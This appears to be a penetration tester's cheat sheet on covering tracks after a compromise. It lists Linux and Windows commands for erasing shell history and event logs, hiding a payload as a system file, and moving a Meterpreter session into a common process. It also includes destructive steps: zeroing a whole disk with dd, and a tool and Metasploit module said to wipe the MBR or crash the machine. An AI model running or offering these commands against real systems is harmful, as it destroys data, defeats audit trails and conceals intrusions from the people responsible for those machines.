## Linux
- Command History (from all sessions): 
   - `home/user/.bash_history`
   - `root/.bash_history`
- How to clear logs:
   1. `export HISTSIZE=0` (clear command history)
   2. `history -c` (clear command history of active session)
   3. `nano /var/log/messages` ; CTL+6 & mark all & CTL-K (delete event logs)
   4. `shred -zu root/.bash_history` (overwrite file with zeros, deallocate and remove after overwriting)
   5. `dd if=/dev/zero of=/dev/sda` (overwrite hard disk with zeros)

## Windows:
- How to clear logs:
   1. via existing meterpreter session: `clearev` (clear event logs + "Log Clear" log appears)
   2. via existing meterpreter session: `run event_manager -c Security` (clear security logs)
   3. via existing meterpreter session: `migrate [pid]` (use pid of common process like explorer.exe)
   4. download [clearlogs.exe](https://sourceforge.net/projects/clearlogs/) onto Windows machine + `run` (no "Log Clear" log pops up in Event Viewer)
   5. CLI: `attrib +h +s payload.exe` (make payload as hidden system file)
   6. Check out: [https://www.scriptjunkie.us/2011/05/system-kill/](https://www.scriptjunkie.us/2011/05/system-kill/) 
      - wipes MBR and Partition Table (!)
   7. via existing meterpreter session: `use post/windows/kill` ; select session ; `run` (crashing the machine and wiping its traces)
